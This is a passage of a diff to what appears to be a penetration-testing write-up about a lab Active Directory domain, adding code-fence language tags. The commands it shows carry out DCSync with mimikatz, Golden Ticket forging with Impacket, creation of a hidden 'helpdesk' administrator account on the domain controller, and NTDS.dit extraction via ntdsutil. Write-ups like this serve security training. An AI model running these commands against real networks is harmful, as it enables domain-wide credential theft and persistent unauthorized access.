 And if we could do that, then we could as well perform a `DCSync` attack and dump credentials from the domain controller.
 
-```
+```c++
 mimikatz # lsadump::dcsync /domain:democorp.com /user:krbtgt
 ```
 
@@ -1929,7 +1962,7 @@ Forging this ticket is a game over, we achieved persistence over the domain.
 
 To generate the Golden Ticket, we must first obtain a Domain SID. This can be achieved by utilizing Impacket's `lookupsid.py` tool. Next, we can craft the ticket using obtained AES256 key (or NTLM hash) belonging to `krbtgt` account using the Impacket's `ticketer.py`.
 
-```
+```bash
 impacket-lookupsid 'democorp.com/j.arnold:F4ll2023!@10.10.24.250'
 impacket-ticketer -domain-sid <SID> -domain democorp.com Administrator -aesKey <key>
 ```
@@ -1965,7 +1998,7 @@ KRB5CCNAME=<ticket> impacket-secretsdump democorp-dc.democorp.com -k -no-pass -t
 
 However when we have the Golden Ticket, we could create the local account on the Domain Controller, and then dump all the hashes using this account over NTLM authentication.
 
-```
+```powershell
 net user helpdesk G3t_somehelp_bro /ADD /Y
 net localgroup Administrators helpdesk /add
 ```
@@ -1974,7 +2007,7 @@ net localgroup Administrators helpdesk /add
 
 After creating the account, we are free to dump all the secrets from the Domain Controller again.
 
-```
+```bash
 impacket-secretsdump 'helpdesk:G3t_somehelp_br0@10.10.24.250'
 ```
 
@@ -1990,7 +2023,7 @@ In order to do that, we can abuse the LOLBin `ntdsutil.exe`.
 
 Let's log into the Domain Controller, and dump the credentials to disk.
 
-```
+```powershell
 mkdir C:\ProgramData\ntds
 powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\ProgramData\ntds' q q"
 ```
@@ -2001,7 +2034,7 @@ The `ntds.dit` file will be saved in `Active Directory` directory, and the `SYST
 
 Now we can download these files with a preferred method, and read the secrets offline.
 
-```
+```bash
 impacket-secretsdump -ntds <ntds> -system <system> -security <security>
 ```
 
